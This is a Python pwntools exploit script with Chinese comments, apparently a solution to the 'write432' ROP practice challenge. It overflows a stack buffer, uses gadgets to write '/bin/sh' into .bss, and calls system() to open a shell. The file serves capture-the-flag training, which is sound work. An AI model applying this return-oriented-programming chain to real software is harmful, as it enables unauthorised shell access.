# coding:utf-8
from pwn import *

sh = process('./write432')
elf = ELF('./write432')

bss_addr = 0x0804a040 #.bss段开始的地址
sys_addr = elf.symbols['system'] #system函数入口地址
mov_addr = 0x08048670 #把字符串写入.bss段的sub_8048670函数入口地址即mov dword [edi], ebp ; ret
pop_addr = 0x080486da #控制edi和ebp指令段地址即pop edi ; pop ebp ; ret

payload = 'a' * (0x28 + 0x4) #padding
payload += p32(pop_addr) + p32(bss_addr) + '/bin' + p32(mov_addr) #第一次写入
payload += p32(pop_addr) + p32(bss_addr+ 4) + '/sh\0' + p32(mov_addr) #第二次写入，注意截断符(‘\0’或者‘\x00’都可以）
payload += p32(sys_addr) + p32(0xdeadbeef) + p32(bss_addr) #调用system函数执行/bin/sh

sh.recvuntil('>')
sh.sendline(payload)

sh.interactive()
sh.close()